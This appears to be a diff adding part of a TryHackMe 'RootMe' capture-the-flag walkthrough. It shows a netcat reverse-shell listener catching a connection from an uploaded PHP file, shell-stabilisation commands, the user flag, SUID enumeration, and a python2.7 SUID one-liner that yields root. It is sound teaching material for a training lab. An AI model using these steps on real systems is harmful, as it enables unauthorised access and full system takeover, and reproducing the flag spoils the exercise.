@@ -120,4 +120,126 @@ The uploaded file was accessed via the browser and executed successfully, allowi
 
 This confirmed that the application is vulnerable to unrestricted file upload via extension bypass.
 
+## Reverse Shell
 
+### Command To Listen 
+```bash
+nc -nvlp 9001
+```
+- click on the .php5 file to get shell
+```ansi
+┌─[zeref@Athena]─[~/TryHackMe/RootMe]─[192.168.137.158]
+└──╼ $ nc -nvlp 9001              
+Listening on 0.0.0.0 9001
+Connection received on 10.49.136.148 56250
+Linux ip-10-49-136-148 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+ 08:26:24 up 41 min,  0 users,  load average: 0.00, 0.04, 0.17
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+```
+
+### Command To Upgrade Shell to Stable Shell
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl + Z
+stty raw -echo; fg
+
+export TERM=xterm
+stty rows 40 columns 120
+```
+### Post Exploitation Enumeration 
+```asni
+www-data@ip-10-49-136-148:/home/test$ cd /var/www
+www-data@ip-10-49-136-148:/var/www$ ls
+html  user.txt
+www-data@ip-10-49-136-148:/var/www$ cat user.txt 
+THM{y0u_g0t_a_sh3ll}
+```
+
+- I found the user flag
+
+## Privilege Escalation
+
+### Checking Sudo Privileges
+
+```bash
+sudo -l
+```
+
+### Observation
+
+The command revealed that the current user has specific sudo privileges, which may be leveraged for privilege escalation.
+
+- In this case it ask pass to check permission.
+```ansi
+www-data@ip-10-49-136-148:/var/www$ sudo -l
+[sudo] password for www-data: 
+Sorry, try again.
+[sudo] password for www-data: 
+Sorry, try again.
+[sudo] password for www-data: 
+sudo: 3 incorrect password attempts
+```
+
+### Checking SUID Binaries
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+### Observation
+
+Several SUID binaries were identified on the system, including:
+
+```
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/python2.7
+/usr/bin/at
+/bin/su
+/bin/mount
+/bin/umount
+```
+
+### Analysis
+
+SUID (Set User ID) binaries execute with the permissions of their owner, typically root. Misconfigured SUID binaries can be leveraged to gain elevated privileges.
+
+Among the discovered binaries, `/usr/bin/python2.7` was identified as a potential vector for privilege escalation, as interpreters with SUID permissions can sometimes be abused to spawn a privileged shell.
+
+---
+
+### Exploitation
+
+The SUID Python binary was used to spawn a shell while preserving elevated privileges:
+
+```bash
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+---
+
+### Result
+
+A root shell was successfully obtained:
+
+```bash
+whoami
+# root
+```
+
+---
+
+### Conclusion
+
+Privilege escalation was achieved by abusing the SUID-enabled Python binary. This vulnerability arises due to improper assignment of SUID permissions to an interpreter, allowing execution of arbitrary commands with root privileges.
+
+# Thanks for Reading | Creator **Zeref0xD**
